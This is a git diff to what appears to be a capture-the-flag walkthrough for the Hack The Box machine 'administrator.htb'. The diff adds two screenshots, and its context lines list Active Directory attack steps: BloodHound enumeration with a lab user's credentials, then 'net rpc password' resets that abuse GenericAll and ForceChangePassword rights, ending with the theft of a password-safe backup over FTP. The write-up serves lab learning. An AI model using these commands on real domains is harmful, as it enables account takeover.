@@ -28,10 +28,16 @@
 	3. `sudo bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns [IP] -c all`
 3. load bloodhound info
 4. bloodhound finds that olivia has GenericAll privs over michael
+
+![image](https://github.com/user-attachments/assets/465491ec-fada-4fb5-93a8-c87657433cbe)
+
 5. change michael's password
 	1. `net rpc password "michael" -U "administrator.htb"/"olivia" -S "[IP]"`
 	2. type new password
 6. michael has ForceChangePassword permission over benjamin
+
+![image](https://github.com/user-attachments/assets/908af74c-ab83-4ecd-841c-7a0a2424dda1)
+
 7. change benjamin's password 
 	1. `net rpc password "benjamin" -U "administrator.htb"/"michael" -S "[IP]"`
 8. benjamin can login to ftp, get Backup.psafe3 file
